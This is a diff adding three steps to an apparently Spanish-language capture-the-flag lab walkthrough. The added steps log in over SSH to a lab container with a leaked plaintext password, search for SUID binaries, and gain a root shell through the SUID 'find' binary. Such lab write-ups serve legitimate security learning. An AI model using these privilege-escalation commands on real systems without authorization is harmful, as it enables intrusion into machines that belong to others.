@@ -97,6 +97,31 @@ stegseek miramebien.jpg
 
 <img width="845" height="519" alt="image" src="https://github.com/user-attachments/assets/892e37f4-6fba-4c1b-9aff-3139355b9a4c" />
 
+### 11. Accederemos mediante el ssh.
+```bash
+ssh carlos@172.17.0.2
+# passwd: carlitos 
+```
+
+<img width="850" height="291" alt="image" src="https://github.com/user-attachments/assets/47aad69e-447f-42d5-bbd3-8677094bdc5c" />
+
+
+### 12. Para poder escalar los privilegios miraremos los binarios que podemos modificar.
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+<img width="843" height="531" alt="image" src="https://github.com/user-attachments/assets/2a905823-c4ab-43fa-baaf-88ac9533c0e4" />
+
+
+### 13. Para explotar utilizaremos el directorio find ya que nos permite ejecutar.
+```bash
+/usr/bin/find . -exec /bin/sh -p \; -quit
+```
+
+<img width="847" height="78" alt="image" src="https://github.com/user-attachments/assets/4d06c029-e3e6-4e65-960d-2d87425d3807" />
+
+
 
 
 
